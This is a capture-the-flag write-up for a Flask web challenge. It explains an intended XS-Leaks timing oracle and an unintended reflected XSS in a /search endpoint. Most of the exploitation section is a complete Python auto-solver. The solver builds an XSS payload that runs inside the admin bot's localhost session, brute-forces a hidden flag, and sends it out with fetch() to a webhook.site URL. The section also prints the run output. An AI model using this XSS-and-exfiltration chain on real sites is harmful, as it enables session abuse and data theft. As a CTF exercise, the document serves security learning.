# Write-up: Leaky CTF Platform (web)

## 1. TL;DR
Although the challenge was designed as an **XS-Leaks (Timing Attack)** challenge (hence the name), we bypassed the intended unstable timing oracle entirely by exploiting an **unintended Reflected XSS** in the `/search` endpoint. By supplying a malicious `localhost` URL to the admin bot, we executed JavaScript in the bot's local context, instantly brute-forced the internal flag prefix, retrieved the real flag, and exfiltrated it to a webhook.

## 2. Problem Analysis (Details)
We are given a Flask web application with a headless Chromium admin bot. Looking at the source code, several key endpoints and behaviors stand out:

1. **`/spam_flags`**: Allows adding up to 100,000 dummy flags into a global `flags` array (max 1,000,000). 
2. **`/search?flag=...`**: Checks if the provided string is a prefix of any flag in the global array using `any(f for f in flags if f.startswith(flag))`. It requires an `admin_secret` cookie.
3. **`/submit_flag?flag=...`**: Takes the correct 8-hex-character internal flag (`leakyctf{...}`) and returns the real CTF flag (`PUCTF26{...}`). No admin cookie is required for this.
4. **`/report`**: Accepts a URL and passes it to the admin bot. The bot sets the `admin_secret` cookie for the domain `localhost` and visits the URL, staying on the page for 60 seconds.

**The Intended Vulnerability (XS-Leaks):**
The author intended for us to spam the server with 1,000,000 dummy flags. Because the correct internal flag is at `flags[0]`, a correct prefix returns instantly (~0ms). An incorrect prefix forces Python to evaluate `startswith()` on all 1,000,000 items, blocking the Global Interpreter Lock (GIL) and delaying the response by ~200ms. By using `fetch()` with `mode: 'no-cors'`, an attacker could measure the timing difference to leak the flag character by character.

**The Unintended Vulnerability (Reflected XSS):**
In the `/search` endpoint, if a flag is not found, the application returns:
```python
return f'"{flag}" not found in our key-value store.', 200
```
Because Flask defaults to `Content-Type: text/html` when returning a string, and there is no Content Security Policy (CSP) or HTML escaping, this is a **trivial Reflected XSS**. 

## 3. Initial Guesses & First Try
My first instinct was to host the exploit on a public HTTPS service like `webhook.site` and trigger the brute-force from there. 

However, this ran into several modern browser security roadblocks:
1. **Mixed Content Policy**: `webhook.site` is HTTPS, but the target `http://localhost:5000` is HTTP. Chrome strictly blocks `fetch()` requests from HTTPS to HTTP.
2. **Private Network Access (PNA)**: Even using an HTTP tunnel (like Pinggy or ngrok), trying to redirect the bot via `window.location.href` from a public IP to a local IP (`localhost`) can be blocked by Chrome's local network access checks. 

**The 504 Timeout Trap:**
During testing, submitting the URL to the `/report` endpoint resulted in a `504 Gateway Time-out` from the Nginx proxy. Initially, this looked like the exploit failed. However, checking the backend code revealed:
```python
await asyncio.sleep(BOT_CONFIG['VISIT_SLEEP_SECOND']) # Sleeps for 60 seconds
```
Because the bot sleeps for 60 seconds while holding the connection, the HTTP request simply times out. **The exploit was actually running perfectly in the background!**

## 4. Exploitation Walkthrough / Flag Recovery
To bypass all CORS, Mixed-Content, and PNA restrictions, we don't need to host our exploit on an external website at all. 

Since the bot visits *whatever URL we provide*, we can simply provide the malicious `localhost` URL directly! 
`http://localhost:5000/search?flag=<script>...[PAYLOAD]...</script>`

When the bot navigates to this URL:
1. It is already on `localhost`, so the `admin_secret` cookie is sent.
2. The XSS executes in a same-origin context.
3. Our JavaScript can rapidly make `fetch()` calls to `/search`, reading the response bodies directly instead of relying on noisy timing attacks.
4. It fully reconstructs the `leakyctf{...}` internal flag, queries `/submit_flag` to get the real flag, and sends it to our webhook.

### The Auto-Solver Script
Because the challenge has Cloudflare Turnstile CAPTCHA enabled on the `/report` endpoint, I wrote a fully automated Python script using Playwright to handle the CAPTCHA and orchestrate the attack in a single process.

```python
import requests
import urllib.parse
import time
import base64
import sys
import asyncio
from playwright.async_api import async_playwright

# --- CONFIGURATION ---
CHAL_BASE = "http://chal.polyuctf.com:45226"
TURNSTILE_WAIT = 120  # Seconds to wait for you to click the captcha

async def get_turnstile_token():
    """Launches a visible browser for the user to solve the Turnstile CAPTCHA."""
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=False, # Must be False so you can see/click the captcha
            args=["--disable-blink-features=AutomationControlled"],
        )
        page = await browser.new_page()
        try:
            await page.goto(f"{CHAL_BASE}/report", wait_until="load")
            print("[*] Browser opened. Please solve the Turnstile CAPTCHA in the window...", flush=True)

            locator = page.locator("#cf-turnstile-response")
            deadline = time.time() + TURNSTILE_WAIT

            while time.time() < deadline:
                try:
                    value = await locator.input_value()
                except:
                    value = ""
                if value:
                    print(f"[+] Turnstile token obtained (len={len(value)})", flush=True)
                    return value
                await asyncio.sleep(1)

            raise RuntimeError("Timed out waiting for Turnstile token.")
        finally:
            await browser.close()

def main():
    print("=== Leaky CTF Platform Auto-Solver ===")
    
    # 1. Provision a unique webhook for exfiltration
    print("[*] Provisioning exfiltration webhook...")
    try:
        token_resp = requests.post("https://webhook.site/token").json()
        uuid = token_resp['uuid']
        webhook_url = f"https://webhook.site/{uuid}"
        print(f"[+] Webhook created: {webhook_url}")
    except Exception as e:
        print(f"[-] Failed to create webhook: {e}")
        sys.exit(1)

    # 2. Craft the XSS payload targeting the bot's localhost
    # This script runs on the admin's machine, brute-forces the hex prefix, 
    # and exfiltrates the final flag back to us.
    js_payload = f"""(async()=>{{
      let f='leakyctf{{';
      let c='0123456789abcdef';
      
      for(let i=0;i<8;i++){{
        for(let x of c){{
          let r = await fetch('/search?flag='+f+x);
          let t = await r.text();
          if(t.includes('" found')){{
            f += x;
            break;
          }}
        }}
      }}
      f += '}}';
      
      let s = await fetch('/submit_flag?flag='+f);
      let t2 = await s.text();
      
      // Send the result to our webhook
      fetch('{webhook_url}?prefix=' + f + '&real_flag=' + btoa(t2));
    }})();"""

    # URL encode the payload correctly
    safe_js = urllib.parse.quote(js_payload)
    exploit_url = f"http://localhost:5000/search?flag=%3Cscript%3E{safe_js}%3C%2Fscript%3E"

    # 3. Handle Turnstile and Submit Report
    try:
        token = asyncio.run(get_turnstile_token())
        print("[*] Submitting report to admin bot...")
        resp = requests.post(
            f"{CHAL_BASE}/report",
            data={"url": exploit_url, "answer": token},
            timeout=20
        )
        print(f"[*] Report Response: {resp.status_code} - {resp.text.strip()}")
    except Exception as e:
        print(f"[-] Error during submission: {e}")
        sys.exit(1)

    # 4. Poll for the Flag
    print("[*] Polling webhook for flag (may take up to 60s)...")
    while True:
        try:
            # Check for new requests at our webhook token
            reqs = requests.get(f"https://webhook.site/token/{uuid}/requests").json()
            for req in reqs.get('data', []):
                query = req.get('query', {})
                if 'real_flag' in query:
                    prefix = query.get('prefix')
                    real_b64 = query.get('real_flag')
                    real_flag = base64.b64decode(real_b64).decode('utf-8')
                    
                    print("\n" + "="*60)
                    print("🏆 FLAG CAPTURED 🏆")
                    print("="*60)
                    print(f"Internal Prefix: {prefix}")
                    print(f"Final Flag Result: {real_flag}")
                    print("="*60 + "\n")
                    sys.exit(0)
            
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(3)
        except Exception as e:
            print(f"\n[-] Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
```

**Output:**
```text
=== Leaky CTF Platform Auto-Solver ===
[*] Provisioning exfiltration webhook...
[+] Webhook created: https://webhook.site/e28f8de6-0299-44cb-8bae-5ade21b8bcfb
[*] Browser opened. Please solve the Turnstile CAPTCHA in the window...
[+] Turnstile token obtained (len=1029)
[*] Submitting report to admin bot...
[*] Report Response: 504 - <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.29.5</center>
</body>
</html>
[*] Polling webhook for flag (may take up to 60s)...

============================================================
🏆 FLAG CAPTURED 🏆
============================================================
Internal Prefix: leakyctf{e5834153}
Final Flag Result: Correct! The real flag is: PUCTF26{Another_XS_Leaks_Timing_Oracle_Thanks_bliutech_from_LA_CTF_2026_mnskD2jQN1ouXPTAt5XncpW88E5s4gPS}
============================================================
```

## 5. What We Learned
* **Unintended XSS kills XS-Leaks:** A single unescaped reflection in a web application allows attackers to read cross-origin responses entirely, rendering complex timing oracles unnecessary. Always sanitize inputs, even in seemingly harmless "Not Found" error messages.
* **Targeting Localhost Directly:** Browsers have strictly updated cross-origin capabilities (like Mixed-Content and PNA blocking) over the years. By forcing the bot to visit its own `localhost` interface directly, we placed our payload in the same-origin context, effortlessly sidestepping all modern network access restrictions.
* **Don't Trust the 504 Timeout:** When dealing with headless CTF bots, a `504 Gateway Time-out` on the web-facing proxy does not mean the exploit failed. If the bot sleeps or blocks the thread longer than the reverse proxy's timeout limit, the exploit logic will continue to execute seamlessly in the background.